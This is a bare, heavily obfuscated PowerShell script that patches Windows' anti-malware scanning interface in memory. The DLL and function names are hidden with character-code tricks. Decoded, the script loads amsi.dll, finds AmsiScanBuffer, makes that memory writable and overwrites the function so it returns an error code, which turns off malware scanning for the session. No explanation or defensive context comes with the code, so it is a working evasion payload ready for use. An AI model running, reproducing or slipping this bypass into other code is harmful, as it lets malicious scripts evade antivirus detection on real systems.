$pA0ZAJWNKodDa1F = @"
using System;
using System.Runtime.InteropServices;
public class pA0ZAJWNKodDa1F {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr qtXm2q7Y, string FmF6d);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr GPsN2RFQbRYsDl_sbzZ3, UIntPtr TUzpV9E7hSBG3, uint ARWoBuyL_ro7R50OYwl, out uint Dx9grWlVqB);
}
"@

Add-Type $pA0ZAJWNKodDa1F

$XgnIlog = [pA0ZAJWNKodDa1F]::LoadLibrary("$(('àm'+'sí'+'.d'+'ll').NOrmAlIZe([chAr]([BYtE]0x46)+[cHar]([BYte]0x6f)+[CHAr](114*58/58)+[CHar]([byte]0x6d)+[Char](68+30-30)) -replace [ChAr](92)+[CHAR]([BYtE]0x70)+[cHAR](123*44/44)+[cHar]([byTe]0x4d)+[CHar](110*1/1)+[cHAR](125))")
$ErWMWb0SpcZv = [pA0ZAJWNKodDa1F]::GetProcAddress($XgnIlog, "$([cHar](65)+[cHAR]([byTE]0x6d)+[CHaR]([BYte]0x73)+[Char](21+84)+[ChaR](70+13)+[cHar]([ByTe]0x63)+[Char]([Byte]0x61)+[cHar]([bYTE]0x6e)+[chAR](66)+[CHAr](117*86/86)+[cHAR](102)+[cHAR]([BYTE]0x66)+[CHar]([BYTe]0x65)+[cHar]([ByTe]0x72))")
$p = 0
[pA0ZAJWNKodDa1F]::VirtualProtect($ErWMWb0SpcZv, [uint32]5, 0x40, [ref]$p)
$k0x5u = "0xB8"
$EUzZAyZ3ZIS = "0x57"
$ucc = "0x00"
$Emg00d3nQiNJ = "0x07"
$SPVoUz8jOi8qwNieoggV = "0x80"
$hASQ = "0xC3"
$k6972 = [Byte[]] ($k0x5u,$EUzZAyZ3ZIS,$ucc,$Emg00d3nQiNJ,+$SPVoUz8jOi8qwNieoggV,+$hASQ)
[System.Runtime.InteropServices.Marshal]::Copy($k6972, 0, $ErWMWb0SpcZv, 6)